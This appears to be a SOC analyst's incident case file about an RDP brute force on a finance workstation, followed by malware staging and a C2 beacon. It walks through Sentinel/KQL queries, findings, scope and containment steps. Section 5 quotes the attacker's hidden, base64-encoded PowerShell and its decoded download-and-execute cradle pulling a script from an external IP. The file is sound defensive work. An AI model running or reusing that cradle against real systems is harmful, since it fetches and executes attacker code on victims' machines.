# Case File — INC-2024-0417

**Sentinel incident:** 2417
**Internal ticket:** INC-2024-0417
**Opened:** 2024-04-17 02:54 UTC
**Analyst:** K. Jonnagaddala (SOC)
**Classification:** True positive — confirmed intrusion
**Status:** Contained, closed with follow-ups

This is my working case file: what the alert said, what I checked, the queries I ran, and
how I reached the verdict. It's in the order I actually worked it, including a couple of
things that turned out to be dead ends, because that's the honest record.

---

## 1. Alert received

Paged at 02:54 UTC on a **High** incident: *Brute Force Followed by Successful Interactive
Logon* on `FIN-WKS-04`. The alert grouped two rule detections onto the same host entity:

- **RDP Brute Force from Single Source** — 214 failed RDP logons from `45.155.205.233`.
- **Brute Force Followed by Successful Interactive Logon** — a `4624` success as
  `CORP\a.patel` from that same IP, right after the failures.

The second one is the reason this is a page and not a dashboard tile. A brute force on its
own is background noise on an internet-exposed host; a brute force that *succeeds* from the
same source is an intrusion until proven otherwise.

First read of the alert, before touching anything:

- Source `45.155.205.233` is external. `FIN-WKS-04` is a finance workstation — no reason
  it should be taking RDP from the internet at all, which is a finding in itself.
- The compromised account, `a.patel`, is a real finance user. So this isn't a spray hitting
  a dead account; the guess landed on a live identity.

## 2. Initial triage

Priority questions I wanted answered, in order:

1. Is the successful logon actually the attacker, or a coincidental legitimate logon by the
   real `a.patel` during the same window?
2. Did anything happen *after* the logon? A login with no follow-on activity is a different
   severity than a login followed by execution.
3. Blast radius: one host, or did it spread?

Scoped everything to the incident window plus padding: `2024-04-17 02:00–04:00 UTC`.

First, confirm the two halves are really the same actor. Query:

```kusto
SecurityEvent
| where TimeGenerated between (datetime(2024-04-17 02:00) .. datetime(2024-04-17 04:00))
| where Computer == "FIN-WKS-04" and EventID in (4624, 4625)
| where LogonType == 10
| summarize Attempts = count(), FirstSeen = min(TimeGenerated), LastSeen = max(TimeGenerated)
    by EventID, IpAddress, TargetUserName
| order by EventID asc, Attempts desc
```

Result: 214 × `4625` from `45.155.205.233` spread across `administrator`, `svc_backup`, and
`a.patel`, ending 02:48:53 — then a single `4624` from `45.155.205.233` as `a.patel` at
02:49:11, 18 seconds later. Same source IP, same host, immediately after the failures
stopped. That's the guess landing. Triage verdict: treat as confirmed unauthorized access,
escalate to full investigation.

## 3. Entities involved

| Entity | Value | Role |
|---|---|---|
| Host | `FIN-WKS-04` (`10.10.20.45`) | Compromised endpoint |
| Account | `CORP\a.patel` | Compromised credential |
| Source IP | `45.155.205.233` | Attacker infrastructure (brute force + RDP) |

## 4. Authentication investigation

**Was the successful logon the real user?** This is the key call, so I checked it three ways.

Same source IP as the brute force (already established). Next, `a.patel`'s normal logon
pattern, to see if a 02:49 UTC RDP session from an external IP is in character:

```kusto
SecurityEvent
| where TimeGenerated > ago(30d)
| where EventID == 4624 and TargetUserName == "a.patel"
| summarize LogonCount = count() by LogonType, IpAddress, bin(TimeGenerated, 1d)
| order by TimeGenerated desc
```

`a.patel` logs on interactively (LogonType 2) from the console and occasionally LogonType 3
from internal `10.10.20.0/24` addresses, during business hours. There is **no** history of
LogonType 10 (RDP) for this account, and none from any external IP. The 02:49 logon is
entirely out of pattern.

Third check — did the attacker try to reuse the credential elsewhere (was it sprayed across
the estate)?

```kusto
SecurityEvent
| where TimeGenerated between (datetime(2024-04-17 02:00) .. datetime(2024-04-17 04:00))
| where EventID in (4624, 4625) and TargetUserName == "a.patel"
| summarize Attempts = count() by Computer, EventID, IpAddress
| order by Computer asc
```

Only `FIN-WKS-04`. The credential wasn't replayed against other hosts from external infra
in the window. (The SSH pivot later comes *from* the workstation, which is a different thing
— covered in §6.)

Dead end worth recording: I checked `4672` (special privileges assigned) for the `a.patel`
logon to see if the session ran with admin rights. It did — `a.patel` is a local admin on
`FIN-WKS-04`, which is why the later PowerShell runs unelevated-but-privileged. That's a
configuration finding, not attacker escalation, so it goes in the report as a hardening
item, not as a technique.

**Authentication conclusion:** the 02:49:11 logon is the attacker using the guessed
`a.patel` password over RDP. Not the legitimate user.

## 5. Endpoint investigation

With unauthorized access confirmed, the question is what they did in the session. Pulled
process creation on the host after the logon:

```kusto
Event
| where TimeGenerated between (datetime(2024-04-17 02:49) .. datetime(2024-04-17 04:00))
| where Computer == "FIN-WKS-04"
| where Source == "Microsoft-Windows-Sysmon" and EventID == 1
| parse EventData with * '<Data Name="Image">' Image '</Data>' *
| parse EventData with * '<Data Name="CommandLine">' CommandLine '</Data>' *
| parse EventData with * '<Data Name="ParentImage">' ParentImage '</Data>' *
| project TimeGenerated, ParentImage, Image, CommandLine
| order by TimeGenerated asc
```

At 02:52:18, three and a half minutes after logon:

```
Parent : C:\Windows\explorer.exe
Image  : C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
Cmd    : powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA...
```

Parent is `explorer.exe` (consistent with a hands-on-keyboard user in an RDP session), and
the command is a hidden-window, no-profile, base64-encoded PowerShell. Decoding the
base64 (`-enc` is UTF-16LE):

```
IEX (New-Object Net.WebClient).DownloadString('http://185.220.101.47/update.ps1')
```

A classic download cradle. That immediately tells me to look for the download and whatever
it wrote to disk:

```kusto
Event
| where TimeGenerated between (datetime(2024-04-17 02:49) .. datetime(2024-04-17 04:00))
| where Computer == "FIN-WKS-04" and Source == "Microsoft-Windows-Sysmon"
| where EventID == 11
| parse EventData with * '<Data Name="Image">' Image '</Data>' *
| parse EventData with * '<Data Name="TargetFilename">' TargetFilename '</Data>' *
| project TimeGenerated, Image, TargetFilename
| order by TimeGenerated asc
```

`powershell.exe` wrote `C:\Users\a.patel\AppData\Local\Temp\update.ps1` at 02:52:55. So the
cradle fired, pulled the second stage, and staged it. That's execution plus tool transfer,
not just a login.

## 6. Network / C2 investigation

Followed the process to the network. Outbound connections from `powershell.exe`:

```kusto
Event
| where TimeGenerated between (datetime(2024-04-17 02:49) .. datetime(2024-04-17 04:00))
| where Computer == "FIN-WKS-04" and Source == "Microsoft-Windows-Sysmon"
| where EventID == 3
| parse EventData with * '<Data Name="Image">' Image '</Data>' *
| parse EventData with * '<Data Name="DestinationIp">' DestinationIp '</Data>' *
| parse EventData with * '<Data Name="DestinationPort">' DestinationPort '</Data>' *
| where Image endswith "powershell.exe"
| project TimeGenerated, DestinationIp, DestinationPort
| order by TimeGenerated asc
```

Two distinct behaviors:

- **02:52:41** — one connection to `185.220.101.47:80`. That's the download (matches the
  cradle URL).
- **02:53:22 onward** — repeated connections to `185.220.101.47:443`, roughly every 60
  seconds. That's a beacon, not a download.

Confirmed the regularity, because "roughly every 60s" is the whole tell:

```kusto
Event
| where TimeGenerated between (datetime(2024-04-17 02:53) .. datetime(2024-04-17 04:00))
| where Computer == "FIN-WKS-04" and Source == "Microsoft-Windows-Sysmon" and EventID == 3
| parse EventData with * '<Data Name="DestinationIp">' DestinationIp '</Data>' *
| parse EventData with * '<Data Name="DestinationPort">' DestinationPort '</Data>' *
| where DestinationIp == "185.220.101.47" and DestinationPort == "443"
| order by TimeGenerated asc
| serialize
| extend GapSeconds = datetime_diff('second', TimeGenerated, prev(TimeGenerated))
| summarize Connections = count(), AvgGap = avg(GapSeconds), StdevGap = stdev(GapSeconds)
```

15 connections, average gap ~60s, standard deviation under 3s. Low-variance interval to a
single external destination over 443 = C2 beacon. Also confirmed the DNS that preceded it:

```kusto
Event
| where Computer == "FIN-WKS-04" and Source == "Microsoft-Windows-Sysmon" and EventID == 22
| parse EventData with * '<Data Name="QueryName">' QueryName '</Data>' *
| parse EventData with * '<Data Name="QueryResults">' QueryResults '</Data>' *
| where QueryName == "cdn-telemetry.net"
| project TimeGenerated, QueryName, QueryResults
```

`cdn-telemetry.net` resolved at 02:53:20, results pointing at `185.220.101.47`. The
"telemetry/CDN" name is a blend-in choice; the domain is the beacon's C2.

**Lateral movement check.** Looked for the compromise spreading. On the Linux side:

```kusto
Syslog
| where TimeGenerated between (datetime(2024-04-17 02:49) .. datetime(2024-04-17 04:00))
| where Facility in ("auth", "authpriv")
| where SyslogMessage has "Failed password" or SyslogMessage has "Accepted password"
| project TimeGenerated, HostName, SyslogMessage
| order by TimeGenerated asc
```

At 03:05:44, `WEB-SRV-02` logged `Failed password for a.patel from 10.10.20.45 port ... ssh2`
— several times, no `Accepted password`. So the attacker tried to pivot from the
workstation to the web server over SSH and **failed** (password auth didn't land). Important
for scoping: the intrusion reached for a second host but did not get it.

## 7. IOC validation

Pulled the indicators and reasoned about each rather than trusting names. Full detail and
the reputation checks are in [`iocs.md`](iocs.md). Summary:

- `45.155.205.233` — external source of the brute force and RDP session. Hosting-provider
  range with a history of scanning/brute-force activity; consistent with the behavior seen.
- `185.220.101.47` — download host and C2. In a range historically associated with Tor
  exit / abuse infrastructure. Both port-80 download and port-443 beacon go here.
- `cdn-telemetry[.]net` — beacon domain, resolves to the C2 IP; benign-sounding name is the
  masquerade.
- `update.ps1` (in `\Temp\`) — staged second stage. `update` in a user Temp folder written
  by `powershell.exe` is not a legitimate update path.

Validation approach: I treated the IPs/domain as suspicious based on the *behavior in my own
data first* (unsolicited external RDP, download cradle, fixed-interval beacon) and used
external reputation only as corroboration, not as the basis for the verdict. The case stands
on the local evidence even if the reputation data were unavailable.

## 8. Scope

- **Confirmed compromised:** `FIN-WKS-04` (host) and `CORP\a.patel` (credential).
- **Attempted, not achieved:** SSH lateral movement to `WEB-SRV-02`. No successful logon
  there; no evidence of code execution on the Linux host.
- **Not observed:** persistence (no run-key/scheduled-task/service creation in Sysmon or
  4688 within the window), privilege escalation beyond the account's existing local-admin
  rights, and data staging or exfiltration. Absence is stated as absence — I looked and
  didn't find it, which is different from proving it didn't happen after telemetry ends.
- **Data at risk:** `a.patel` is a finance user with local admin on the workstation. Any
  files or cached credentials on `FIN-WKS-04` should be considered exposed for the duration
  of the session (02:49–containment).

## 10. Verdict — true positive

**True positive, confirmed intrusion.** Reasoning:

- The successful logon is out of pattern for `a.patel` (no RDP history, no external-IP
  history) and originates from the same external IP that just failed 214 times. Not the
  legitimate user.
- Post-logon activity is unambiguously malicious tradecraft: hidden encoded PowerShell
  download cradle, staged payload, and a fixed-interval HTTPS beacon to a masqueraded
  domain. This is not explainable as benign admin work.
- A lateral-movement attempt to a second host confirms intent beyond a single machine.

No single indicator carries this alone; the chain does. If the beacon regularity or the
out-of-pattern logon stood by itself I'd hedge, but together with the cradle and the pivot
there's no benign reading.

## 11. Containment recommendation

Acted/recommended at 03:20 UTC:

1. **Isolate `FIN-WKS-04`** from the network immediately (host isolation / network quarantine),
   preserving the machine for forensics rather than powering it off.
2. **Disable `CORP\a.patel`** and force a credential reset once a clean channel is
   confirmed. Assume the password is burned.
3. **Block** `45.155.205.233` and `185.220.101.47` at the perimeter, and sinkhole/deny
   `cdn-telemetry[.]net`.
4. **Remove the internet-facing RDP exposure** on `FIN-WKS-04` (and audit the estate for any
   other host with 3389 reachable externally). This is the root-cause exposure.
5. **Reset `svc_backup`** as a precaution — it was a brute-force target even though it wasn't
   the account that fell.
6. Preserve `update.ps1` and the relevant logs as evidence before remediating the host.

## 12. Follow-ups

- Confirm no persistence was established (full host forensics on the isolated machine;
  telemetry only covers the observed window).
- Verify `WEB-SRV-02` was not accessed by any other means; disable SSH password auth there.
- Enforce MFA / disable direct RDP; require access via a bastion.
- Review why a finance workstation had internet-reachable RDP in the first place — this is a
  process gap, not just a host misconfiguration.
- Tune the beacon rule's allowlist and confirm rule 04 would have caught this independently
  (it does, on the 443 traffic).
